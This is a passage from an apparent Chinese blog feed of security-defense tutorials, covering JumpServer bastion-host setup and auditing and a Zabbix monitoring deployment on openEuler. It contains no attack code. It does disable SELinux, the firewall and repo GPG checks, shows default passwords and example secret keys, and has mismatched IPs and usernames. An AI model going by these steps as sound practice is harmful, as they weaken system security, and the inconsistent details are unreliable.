class="line">  <span class="attr">╚█████╔╝╚██████╔╝██║</span> <span class="string">╚═╝ ██║██║     ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║</span></span><br><span class="line">   <span class="attr">╚════╝</span>  <span class="string">╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝</span></span><br><span class="line"></span><br><span class="line">                                                                   <span class="attr">Version</span>:  <span class="string">v2.28.6</span></span><br><span class="line"></span><br><span class="line"><span class="attr">1.</span> <span class="string">检查配置文件</span></span><br><span class="line"><span class="attr">配置文件位置</span>: <span class="string">/opt/jumpserver/config</span></span><br><span class="line"><span class="attr">/opt/jumpserver/config/config.txt</span>        <span class="string">[ √ ]</span></span><br><span class="line"><span class="attr">/opt/jumpserver/config/nginx/cert/server.crt</span>     <span class="string">[ √ ]</span></span><br><span class="line"><span class="attr">/opt/jumpserver/config/nginx/cert/server.key</span>     <span class="string">[ √ ]</span></span><br><span class="line"><span class="attr">完成</span></span><br></pre></td></tr></table></figure><h3 id="安装配置JumpServer"><a href="#安装配置JumpServer" class="headerlink" title="安装配置JumpServer"></a>安装配置JumpServer</h3><p><strong>安装配置：</strong></p><ul><li>配置存储位置、数据库、端口等</li><li>按默认即可（一路回车）</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&gt;&gt;&gt;</span> <span class="string">安装配置 JumpServer</span></span><br><span class="line"><span class="attr">1.</span> <span class="string">配置加密密钥</span></span><br><span class="line"><span class="attr">SECRETE_KEY</span>:     <span class="string">YWQ5YzRkNTYtZmRjMC00OGJlLWQ5ODAtY2QxY2JmMTE1MjFl</span></span><br><span class="line"><span class="attr">BOOTSTRAP_TOKEN</span>: <span class="string">YWQ5YzRkNTYtZmRjMC00OGJl</span></span><br><span class="line"><span class="attr">完成</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.</span> <span class="string">配置持久化目录</span></span><br><span class="line"><span class="attr">是否需要自定义持久化存储,</span> <span class="string">默认将使用目录 /data/jumpserver? (y/n)  (默认为 n):</span></span><br><span class="line"><span class="attr">完成</span></span><br><span class="line"></span><br><span class="line"><span class="attr">3.</span> <span class="string">配置 MySQL</span></span><br><span class="line"><span class="attr">是否使用外部</span> <span class="string">MySQL? (y/n)  (默认为 n):</span></span><br><span class="line"><span class="attr">完成</span></span><br><span class="line"></span><br><span class="line"><span class="attr">4.</span> <span class="string">配置 Redis</span></span><br><span class="line"><span class="attr">是否使用外部</span> <span class="string">Redis? (y/n)  (默认为 n):</span></span><br><span class="line"><span class="attr">完成</span></span><br><span class="line"></span><br><span class="line"><span class="attr">5.</span> <span class="string">配置对外端口</span></span><br><span class="line"><span class="attr">是否需要配置</span> <span class="string">JumpServer 对外访问端口? (y/n)  (默认为 n):</span></span><br><span class="line"><span class="attr">完成</span></span><br><span class="line"></span><br><span class="line"><span class="attr">6.</span> <span class="string">初始化数据库</span></span><br></pre></td></tr></table></figure><h3 id="启动JumpServer"><a href="#启动JumpServer" class="headerlink" title="启动JumpServer"></a>启动JumpServer</h3><p><strong>启动服务</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@JumpServer</span> <span class="string">jumpserver-offline-installer-v2.28.6-amd64-179]# ./jmsctl.sh start</span></span><br></pre></td></tr></table></figure><p><strong>WEB访问</strong></p><ul><li>http:&#x2F;&#x2F;服务器IP地址</li></ul><h3 id="首次登录需要修改密码"><a href="#首次登录需要修改密码" class="headerlink" title="首次登录需要修改密码"></a>首次登录需要修改密码</h3><p><strong>首次登录需要修改密码</strong></p><ul><li>默认用户名：admin</li><li>默认密码：admin</li></ul><p><img src="/../img/img_artical/net_sec/11.3.5.png" alt="11.3.5"></p><h2 id="Linux安全管理"><a href="#Linux安全管理" class="headerlink" title="Linux安全管理"></a>Linux安全管理</h2><h3 id="企业需求"><a href="#企业需求" class="headerlink" title="企业需求"></a>企业需求</h3><p><strong>企业需求</strong></p><ul><li>预防来自外部的黑客入侵攻击，保证企业数据安全</li><li>对运维人员管理服务器过程，进行监控，跟踪、记录，降低运维事故，提高内部综合安全管控能力，保证企业数据和业务安全</li><li>按业务需求分配账号，资源授权，从根本上杜绝账号共享，权限泛滥</li><li>满足国家等级保护要求</li></ul><h3 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h3><ul><li>安装一台openEuler部署JumpServer 堡垒机</li><li>另外安装一台openEuler，作为公司服务器</li><li>采用“旁路”在不改变原有网络结构的情况下，实现快速部署</li><li>用户登录堡垒机，通过堡垒机访问被保护的服务器</li><li>堡垒机执行账号分配、身份认证、访问控制、资源授权、行为审计</li></ul><p><img src="/../img/img_artical/net_sec/11.3.6.png" alt="11.3.6"></p><h3 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h3><p><strong>配置步骤</strong></p><ul><li>1）创建堡垒机用户和用户组</li><li>2）创建系统用户-普通用户</li><li>3）创建系统用户-特权用户</li><li>4）创建资产</li><li>5）创建资产授权</li><li>6）测试推送及连通性</li><li>7）测试远程连接</li></ul><p><strong>用户分类</strong></p><ul><li>堡垒机用户：用于在用户电脑上访问堡垒机</li><li>系统用户：用于堡垒机访问资产的用户，存在于资产上</li><li>普通用户：用于堡垒机访问资产的普通用户</li><li>特权用户：用于堡垒机访问资产的超级用户</li><li>资产：被保护的服务器、网络设备等，IP地址、协议、系统</li><li>资产授权：授权堡垒机用户以系统用户身份访问资产资源</li></ul><h3 id="第一步：创建堡垒机用户和用户组"><a href="#第一步：创建堡垒机用户和用户组" class="headerlink" title="第一步：创建堡垒机用户和用户组"></a>第一步：创建堡垒机用户和用户组</h3><p><strong>用户：员工登录堡垒机时使用的账户，可授权访问相应的资产</strong></p><p><img src="/../img/img_artical/net_sec/11.3.7.png" alt="11.3.7"></p><p><strong>用户组，用于批量授权用户访问相应的资产</strong></p><p><img src="/../img/img_artical/net_sec/11.3.8.png" alt="11.3.8"></p><h3 id="第二步：创建系统用户-普通用户"><a href="#第二步：创建系统用户-普通用户" class="headerlink" title="第二步：创建系统用户-普通用户"></a>第二步：创建系统用户-普通用户</h3><ul><li>系统用户：是JumpServer 登录资产时使用的账号</li><li>普通用户：资产服务器上预先存在的或由特权用户来自动创建</li></ul><p><img src="/../img/img_artical/net_sec/11.3.9.png" alt="11.3.9"></p><h3 id="第三步：创建系统用户-特权用户"><a href="#第三步：创建系统用户-特权用户" class="headerlink" title="第三步：创建系统用户-特权用户"></a>第三步：创建系统用户-特权用户</h3><p><strong>特权用户：是资产已存在的，并且拥有 高级权限 的系统用户</strong></p><ul><li>默认Linux 系统中的root，Windows系统中的administrator</li><li>JumpServer使用该用户来“推送系统用户”、“获取资产硬件信息”等</li></ul><p><img src="/../img/img_artical/net_sec/11.3.10.png" alt="11.3.10"></p><h3 id="第四步：创建资产-资产树"><a href="#第四步：创建资产-资产树" class="headerlink" title="第四步：创建资产-资产树"></a>第四步：创建资产-资产树</h3><p><strong>资产列表以节点方式（资产树）组织，方便查看和管理</strong></p><p><img src="/../img/img_artical/net_sec/11.3.11.png" alt="11.3.11"></p><p><strong>资产是被保护的服务器或网络设备等</strong></p><ul><li>配置IP地址、系统平台、访问协议、认证、节点等</li></ul><p><img src="/../img/img_artical/net_sec/11.3.12.png" alt="11.3.12"></p><h3 id="第五步：创建资产授权"><a href="#第五步：创建资产授权" class="headerlink" title="第五步：创建资产授权"></a>第五步：创建资产授权</h3><p><strong>授权堡垒机用户以系统用户身份访问资产资源</strong></p><p><img src="/../img/img_artical/net_sec/11.3.13.png" alt="11.3.13"></p><h3 id="第六步：测试连通性"><a href="#第六步：测试连通性" class="headerlink" title="第六步：测试连通性"></a>第六步：测试连通性</h3><ul><li>推送所有系统用户到资产</li><li>测试所有系统用户可连接性</li></ul><p><img src="/../img/img_artical/net_sec/11.3.14.png" alt="11.3.14"></p><h3 id="远程Linux服务器"><a href="#远程Linux服务器" class="headerlink" title="远程Linux服务器"></a>远程Linux服务器</h3><p><strong>用创建的用户登录堡垒机，打开工作台，查找我的资产</strong></p><p><img src="/../img/img_artical/net_sec/11.3.15.png" alt="11.3.15"></p><p><strong>连接Linux服务器</strong></p><p><img src="/../img/img_artical/net_sec/11.3.16.png" alt="11.3.16"></p><h2 id="Windows安全管理"><a href="#Windows安全管理" class="headerlink" title="Windows安全管理"></a>Windows安全管理</h2><h3 id="方案设计-1"><a href="#方案设计-1" class="headerlink" title="方案设计"></a>方案设计</h3><ul><li>安装一台openEuler部署JumpServer堡垒机</li><li>另外Windows Server 2008，作为公司服务器</li><li>采用“旁路”在不改变原有网络结构的情况下，实现快速部署</li><li>用户登录堡垒机，通过堡垒机访问被保护的服务器</li><li>堡垒机执行账号分配、身份认证、访问控制、资源授权、行为审计</li></ul><h3 id="配置步骤-1"><a href="#配置步骤-1" class="headerlink" title="配置步骤"></a>配置步骤</h3><p><strong>配置步骤</strong></p><ul><li>1）创建堡垒机用户和用户组</li><li>2）在Windows服务器上准备普通用户</li><li>3）创建系统用户-普通用户</li><li>4）创建资产</li><li>5）创建资产授权</li><li>6）测试远程连接</li></ul><h3 id="第一步：创建用户和用户组"><a href="#第一步：创建用户和用户组" class="headerlink" title="第一步：创建用户和用户组"></a>第一步：创建用户和用户组</h3><p><strong>用户：员工登录堡垒机时使用的账户</strong></p><p><img src="/../img/img_artical/net_sec/11.3.17.png" alt="11.3.17"></p><h3 id="第二步：在Windows上手动创建用户"><a href="#第二步：在Windows上手动创建用户" class="headerlink" title="第二步：在Windows上手动创建用户"></a>第二步：在Windows上手动创建用户</h3><p><strong>建议手动创建一个用户 (不建议使用超级管理员用户)，可以在命令提示符cmd下执行</strong></p><ul><li>创建用户jms2，密码jms123..</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="string">\Users\Administrator&gt;net user jingliu jingliu123.. /add</span></span><br></pre></td></tr></table></figure><ul><li>将用户jingliu加入到Remote Desktop Users组</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="string">\Users\Administrator&gt;net localgroup &quot;Remote Desktop Users&quot; &quot;jms2&quot; /add</span></span><br></pre></td></tr></table></figure><h3 id="第三步：创建系统用户-普通用户"><a href="#第三步：创建系统用户-普通用户" class="headerlink" title="第三步：创建系统用户-普通用户"></a>第三步：创建系统用户-普通用户</h3><p><strong>使用提前在Windows服务器上创建的用户jms2</strong></p><p><img src="/../img/img_artical/net_sec/11.3.18.png" alt="11.3.18"></p><h3 id="第四步：创建资产-资产服务器"><a href="#第四步：创建资产-资产服务器" class="headerlink" title="第四步：创建资产-资产服务器"></a>第四步：创建资产-资产服务器</h3><p><strong>资产是被保护的服务器或网络设备等</strong></p><ul><li>配置IP地址、系统平台、访问协议、节点等</li></ul><p><img src="/../img/img_artical/net_sec/11.3.19.png" alt="11.3.19"></p><h3 id="第五步：创建资产授权规则"><a href="#第五步：创建资产授权规则" class="headerlink" title="第五步：创建资产授权规则"></a>第五步：创建资产授权规则</h3><p><strong>授权堡垒机用户以系统用户身份访问资产资源</strong></p><p><img src="/../img/img_artical/net_sec/11.3.20.png" alt="11.3.20"></p><h3 id="远程Windows服务器"><a href="#远程Windows服务器" class="headerlink" title="远程Windows服务器"></a>远程Windows服务器</h3><p><strong>用堡垒机用户dashan登录</strong></p><p><img src="/../img/img_artical/net_sec/11.3.21.png" alt="11.3.21"></p><p><strong>连接Windows服务器</strong></p><p><img src="/../img/img_artical/net_sec/11.3.22.png" alt="11.3.22"></p><h2 id="会话审计与日志审计"><a href="#会话审计与日志审计" class="headerlink" title="会话审计与日志审计"></a>会话审计与日志审计</h2><h3 id="会话审计"><a href="#会话审计" class="headerlink" title="会话审计"></a>会话审计</h3><p><strong>在线会话</strong></p><ul><li>通过审计台可以实时监控屏幕操作，可以随时中断连接</li></ul><p><img src="/../img/img_artical/net_sec/11.3.23.png" alt="11.3.23"></p><p><strong>历史会话</strong></p><ul><li>可以回放监控到的视频，可以下载监控到的视频</li></ul><p><img src="/../img/img_artical/net_sec/11.3.24.png" alt="11.3.24"></p><p><strong>命令记录</strong></p><p><img src="/../img/img_artical/net_sec/11.3.25.png" alt="11.3.25"></p><h3 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h3><p><strong>登录日志</strong></p><p><img src="/../img/img_artical/net_sec/11.3.26.png" alt="11.3.26"></p><p><strong>操作日志</strong></p><p><img src="/../img/img_artical/net_sec/11.3.27.png" alt="11.3.27"></p><p><strong>改密日志</strong></p><p><img src="/../img/img_artical/net_sec/11.3.28.png" alt="11.3.28"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络安全防御2</title>
      <link href="/posts/secdef2.html"/>
      <url>/posts/secdef2.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全防御"><a href="#网络安全防御" class="headerlink" title="网络安全防御"></a>网络安全防御</h1><h2 id="网络监控基础"><a href="#网络监控基础" class="headerlink" title="网络监控基础"></a>网络监控基础</h2><h3 id="开源监控方案"><a href="#开源监控方案" class="headerlink" title="开源监控方案"></a>开源监控方案</h3><ul><li>拥有集成化、自动化、Web管理等优势</li><li>监控结果直观、支持报警插件</li></ul><p><img src="/../img/img_artical/net_sec/11.2.1.png" alt="11.2.1"></p><h3 id="zabbix体系架构"><a href="#zabbix体系架构" class="headerlink" title="zabbix体系架构"></a>zabbix体系架构</h3><ul><li>采集数据</li><li>展示结果</li><li>触发告警</li></ul><p><img src="/../img/img_artical/net_sec/11.2.2.png" alt="11.2.2"></p><p><img src="/../img/img_artical/net_sec/11.2.3.png" alt="11.2.3"></p><h3 id="确认zabbix主控机环境"><a href="#确认zabbix主控机环境" class="headerlink" title="确认zabbix主控机环境"></a>确认zabbix主控机环境</h3><p><strong>一台openEuler 22.03主机</strong></p><ul><li>主机名：zbx.ntd.cn，IP地址：192.168.10.233&#x2F;24</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# nmtui                                                     //设置主机名为zbx.ntd.cn</span></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# vim /etc/hosts</span></span><br><span class="line"><span class="attr">192.168.10.223</span>  <span class="string">zbx  zbx.ntd.cn                                         //添加zabbix主控机的域名映射记录</span></span><br><span class="line"><span class="attr">192.168.10.224</span>  <span class="string">client1  client1.ntd.cn                                 //添加client1被控机的域名映射记录</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# ping zbx</span></span><br><span class="line"><span class="attr">PING</span> <span class="string">zbx (192.168.10.223) 56(84) 字节的数据。</span></span><br><span class="line"><span class="attr">64</span> <span class="string">字节，来自 zbx (192.168.10.223): icmp_seq=1 ttl=64 时间=0.048 毫秒</span></span><br><span class="line"><span class="attr">64</span> <span class="string">字节，来自 zbx (192.168.10.223): icmp_seq=2 ttl=64 时间=0.052 毫秒</span></span><br><span class="line"><span class="attr">64</span> <span class="string">字节，来自 zbx (192.168.10.223): icmp_seq=3 ttl=64 时间=1.70 毫秒       //ping域名能找到正确的IP地址</span></span><br></pre></td></tr></table></figure><h3 id="更换软件源设置"><a href="#更换软件源设置" class="headerlink" title="更换软件源设置"></a>更换软件源设置</h3><p><strong>排除其他源干扰，安装更省事</strong></p><ul><li>改用CentOS 9-stream的源，依赖包资源比较完整</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# rm -rf /etc/yum.repos.d/*.repo           //清理旧源</span></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# vim /etc/yum.repos.d/cs9.repo             //配置新源</span></span><br><span class="line"><span class="attr">[BaseOS]</span></span><br><span class="line"><span class="attr">name</span>=<span class="string">BaseOS</span></span><br><span class="line"><span class="attr">baseurl</span>=<span class="string">https://mirrors.aliyun.com/centos-stream/9-stream/BaseOS/x86_64/os</span></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="string">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AppStream]</span></span><br><span class="line"><span class="attr">name</span>=<span class="string">appstream</span></span><br><span class="line"><span class="attr">baseurl</span>=<span class="string">https://mirrors.aliyun.com/centos-stream/9-stream/AppStream/x86_64/os</span></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="string">0</span></span><br></pre></td></tr></table></figure><h3 id="安全策略调整"><a href="#安全策略调整" class="headerlink" title="安全策略调整"></a>安全策略调整</h3><ul><li>设置防火墙允许80端口通过</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# firewall-cmd --zone=public --add-port=80/tcp --permanent</span></span><br><span class="line"><span class="attr">//设置防火墙允许80端口通过</span></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# systemctl restart firewalld            //重启防火墙</span></span><br></pre></td></tr></table></figure><ul><li>禁用SELinux机制</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# setenforce 0           //使SELinux失效</span></span><br></pre></td></tr></table></figure><h3 id="快速安装LAMP平台"><a href="#快速安装LAMP平台" class="headerlink" title="快速安装LAMP平台"></a>快速安装LAMP平台</h3><p><strong>离线安装</strong></p><ul><li>预先准备离线素材lamp80&#x2F;，上传到&#x2F;root&#x2F;目录下</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# yum -y remove openEuler-logos                 //卸载冲突包</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# ls /root/lamp80/                              //查看是否上传成功</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# yum -y install /root/lamp80/*.rpm             //安装</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# systemctl enable httpd mariadb php-fpm --now  //设置开机自启</span></span><br></pre></td></tr></table></figure><h2 id="部署zabbix主控端"><a href="#部署zabbix主控端" class="headerlink" title="部署zabbix主控端"></a>部署zabbix主控端</h2><h3 id="安装zabbix服务"><a href="#安装zabbix服务" class="headerlink" title="安装zabbix服务"></a>安装zabbix服务</h3><p><strong>将目录zbx62_pkgs&#x2F;上传到主控机&#x2F;root目录下</strong></p><ul><li>找到子目录zabbix62&#x2F;下的*.rpm包，完成离线安装</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# ls zbx62_pkgs/                               //确认上传结果</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# yum -y install zbx62_pkgs/zabbix62/*.rpm     //装离线包</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# yum list &quot;zabbix*&quot;                           //检查安装结果</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Installed</span> <span class="string">Packages</span></span><br><span class="line"><span class="attr">zabbix-agent.x86_64</span>                    <span class="string">6.2.3-release1.el9            @@commandline      //zabbix代理</span></span><br><span class="line"><span class="attr">zabbix-server-mysql.x86_64</span>             <span class="string">6.2.3-release1.el9            @@commandline      //zabbix服务器</span></span><br><span class="line"><span class="attr">zabbix-web.noarch</span>                      <span class="string">6.2.3-release1.el9            @@commandline      //网页前端</span></span><br></pre></td></tr></table></figure><h3 id="配置Web界面"><a href="#配置Web界面" class="headerlink" title="配置Web界面"></a>配置Web界面</h3><ul><li>先重启httpd服务，再访问<a href="http://192.168.10.223/zabbix">http://192.168.10.223/zabbix</a></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# systemctl restart httpd         //更新新安装的网页配置</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/11.2.4.png" alt="11.2.4"></p><ul><li>检查必要条件</li></ul><p><img src="/../img/img_artical/net_sec/11.2.5.png" alt="11.2.5"></p><ul><li>准备数据库环境</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# mysql -uroot -p</span></span><br><span class="line"></span><br><span class="line"><span class="attr">MariaDB</span> <span class="string">[(none)]&gt; create database zabbix character set utf8mb4 collate utf8mb4_bin;</span></span><br><span class="line"><span class="attr">//建库</span></span><br><span class="line"><span class="attr">MariaDB</span> <span class="string">[(none)]&gt; create user zabbix@localhost identified by &#x27;zbxdb@1234&#x27;；</span></span><br><span class="line"><span class="attr">//建用户</span></span><br><span class="line"><span class="attr">MariaDB</span> <span class="string">[(none)]&gt; grant all on zabbix.* to zabbix@localhost;</span></span><br><span class="line"><span class="attr">//为用户授权</span></span><br><span class="line"><span class="attr">MariaDB</span> <span class="string">[(none)]&gt; set global log_bin_trust_function_creators=1;</span></span><br><span class="line"><span class="attr">//取消存储函数限制</span></span><br><span class="line"><span class="attr">MariaDB</span> <span class="string">[(none)]&gt; quit</span></span><br><span class="line"><span class="attr">//退出数据库</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# zcat /usr/share/zabbix-sql-scripts/mysql/server.sql.gz | mysql --default-character-set=utf8mb4 -uzabbix -pzbxdb@1234 zabbix                      </span></span><br><span class="line"><span class="attr">//导入初始表</span></span><br></pre></td></tr></table></figure><ul><li>如果数据库连接正常，可以继续下一步，否则会报错</li></ul><p><img src="/../img/img_artical/net_sec/11.2.6.png" alt="11.2.6"></p><ul><li>后续步骤继续，确认安装以后，成功看到登录界面</li></ul><p><img src="/../img/img_artical/net_sec/11.2.7.png" alt="11.2.7"></p><h3 id="登录zabbix网页前端"><a href="#登录zabbix网页前端" class="headerlink" title="登录zabbix网页前端"></a>登录zabbix网页前端</h3><p><strong>默认管理员：Admin，密码为zabbix</strong></p><ul><li>如果zabbix-server服务未启动，登录网页前端后会报错</li></ul><p><img src="/../img/img_artical/net_sec/11.2.8.png" alt="11.2.8"></p><h3 id="启用zabbix-server主控服务"><a href="#启用zabbix-server主控服务" class="headerlink" title="启用zabbix-server主控服务"></a>启用zabbix-server主控服务</h3><ul><li>要告知zabbix-server如何访问数据库</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# vim /etc/zabbix/zabbix_server.conf</span></span><br><span class="line"></span><br><span class="line"><span class="attr">DBName</span>=<span class="string">zabbix                         //数据库名</span></span><br><span class="line"><span class="attr">DBUser</span>=<span class="string">zabbix                         //数据库用户</span></span><br><span class="line"><span class="attr">DBPassword</span>=<span class="string">zbxdb@1234                 //连接密码，注意删除首行#号</span></span><br></pre></td></tr></table></figure><ul><li>启动zabbix-server服务</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# systemctl enable zabbix-server --now</span></span><br><span class="line"><span class="attr">//设置开机自启并立即启动</span></span><br></pre></td></tr></table></figure><h2 id="部署zabbix被控端"><a href="#部署zabbix被控端" class="headerlink" title="部署zabbix被控端"></a>部署zabbix被控端</h2><h3 id="确认zabbix被控端环境"><a href="#确认zabbix被控端环境" class="headerlink" title="确认zabbix被控端环境"></a>确认zabbix被控端环境</h3><p><strong>一台openEuler 22.03主机</strong></p><ul><li>主机名：clinet1.ntd.cn，IP地址：192.168.10.233&#x2F;24</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@clinet1</span> <span class="string">~]# nmtui                                                     //设置主机名为clinet1.ntd.cn</span></span><br></pre></td></tr></table></figure><ul><li>关闭防火墙及SELinux</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@clinet1</span> <span class="string">~]# systemctl disable firewalld --now</span></span><br><span class="line"><span class="attr">[root@clinet1</span> <span class="string">~]# setenforce 0</span></span><br></pre></td></tr></table></figure><h3 id="安装被控端组件"><a href="#安装被控端组件" class="headerlink" title="安装被控端组件"></a>安装被控端组件</h3><p><strong>被监控的Linux主机需要部署zabbix-agent代理程序</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@client1</span> <span class="string">~]# yum  -y  install  zbx62_pkgs/zabbix62/zabbix-agent*.rpm         //安装agent代理包</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@client1</span> <span class="string">~]# yum list &quot;zabbix*&quot;                                              //检查安装结果</span></span><br><span class="line"><span class="attr">zabbix-agent.x86_64</span>                       <span class="string">6.2.3-release1.el9                        @@commandline</span></span><br></pre></td></tr></table></figure><h3 id="启用zabbix-agent被控服务"><a href="#启用zabbix-agent被控服务" class="headerlink" title="启用zabbix-agent被控服务"></a>启用zabbix-agent被控服务</h3><ul><li>调整监听设置，允许主控机来采集数据</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@client1</span> <span class="string">~]# vim  /etc/zabbix/zabbix_agentd.conf</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Server</span>=<span class="string">192.168.10.223              //添加主控机地址，多个地址以逗号分隔</span></span><br><span class="line"><span class="attr">ServerActive</span>=<span class="string">192.168.10.223       //添加主控机地址，多个地址以逗号分隔</span></span><br><span class="line"><span class="attr">Hostname</span>=<span class="string">client1.ntd.cn           //本机的主机名（且主控机能ping通这个主机名）</span></span><br></pre></td></tr></table></figure><ul><li>启用zabbix-agent服务</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@client1</span> <span class="string">~]# systemctl enable zabbix-agent --now        //设置开机自启</span></span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><strong>在主控端进行测试</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# zabbix_get -s 192.168.10.224 -k agent.ping</span></span><br><span class="line"><span class="attr">1</span></span><br><span class="line"><span class="attr">//结果为1表示被控端可达</span></span><br></pre></td></tr></table></figure><h2 id="管理监控项"><a href="#管理监控项" class="headerlink" title="管理监控项"></a>管理监控项</h2><h3 id="用户登录及账号控制"><a href="#用户登录及账号控制" class="headerlink" title="用户登录及账号控制"></a>用户登录及账号控制</h3><p><strong>登入zabbix控制台<a href="http://192.168.10.223/zabbix/">http://192.168.10.223/zabbix/</a></strong></p><ul><li>默认管理员账号Admin，密码是zabbix</li><li>单击左侧栏User Setting，将界面语言修改为Chinese（zh_CN）</li></ul><p><img 